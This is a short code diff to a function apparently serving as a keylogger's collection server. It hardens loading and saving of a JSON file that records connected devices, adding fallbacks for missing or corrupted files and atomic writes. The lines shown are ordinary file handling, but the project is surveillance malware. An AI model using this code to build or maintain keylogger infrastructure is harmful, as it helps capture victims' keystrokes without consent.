@@ -251,12 +251,38 @@ def start_keylogger_server():
             }, f, indent=4)
 
     def load_master():
-        with open(master_file, "r") as f:
-            return json.load(f)
+        try:
+            if not os.path.exists(master_file):
+                return {
+                    "devices": [],
+                    "total_connected": 0,
+                    "last_connected_device": None
+                }
+
+            if os.stat(master_file).st_size == 0:
+                return {
+                    "devices": [],
+                    "total_connected": 0,
+                    "last_connected_device": None
+                }
+
+            with open(master_file, "r") as f:
+                return json.load(f)
+
+        except json.JSONDecodeError:
+            console.print("[red][!] JSON file empty or corrupted[/red]")
+            return {
+                "devices": [],
+                "total_connected": 0,
+                "last_connected_device": None
+            }
+
 
     def save_master(data):
-        with open(master_file, "w") as f:
+        tmp = master_file + ".tmp"
+        with open(tmp, "w") as f:
             json.dump(data, f, indent=4)
+        os.replace(tmp, master_file)
 
     @sio.event
     def connect(sid, environ):
